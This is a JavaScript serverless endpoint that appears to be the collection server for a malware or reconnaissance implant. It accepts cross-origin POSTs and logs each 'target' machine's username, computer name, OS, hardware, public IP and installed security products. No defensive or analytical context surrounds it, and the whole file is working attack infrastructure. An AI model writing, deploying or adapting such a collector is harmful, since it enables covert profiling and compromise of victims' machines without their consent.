module.exports = async (req, res) => {
  // Handle CORS preflight
  if (req.method === 'OPTIONS') {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    return res.status(200).end();
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const timestamp = new Date().toISOString();
    
    console.log('📨 Request received at:', timestamp);
    console.log('🌐 From IP:', clientIP);

    let systemData;
    try {
      const { data } = req.body;
      systemData = typeof data === 'string' ? JSON.parse(data) : data;
    } catch (e) {
      systemData = req.body;
    }

    // Log the received data
    console.log('🎯 TARGET DATA RECEIVED:');
    console.log('────────────────────────────');
    console.log('⏰ Time:', timestamp);
    console.log('🌐 IP:', clientIP);
    console.log('👤 User:', systemData?.UserName || 'Unknown');
    console.log('💻 Computer:', systemData?.ComputerName || 'Unknown');
    console.log('🖥️ OS:', systemData?.OS || 'Unknown');
    console.log('🔧 CPU:', systemData?.CPU || 'Unknown');
    console.log('💾 RAM:', systemData?.RAM_GB || 'Unknown', 'GB');
    console.log('📡 Public IP:', systemData?.PublicIP || 'Unknown');
    console.log('🛡️ Security:', systemData?.SecurityProducts || 'None');
    console.log('────────────────────────────');

    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    res.status(200).json({ 
      status: 'success',
      message: 'Data received',
      timestamp: timestamp
    });

  } catch (error) {
    console.error('❌ Error:', error);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.status(500).json({ error: 'Internal server error' });
  }
};
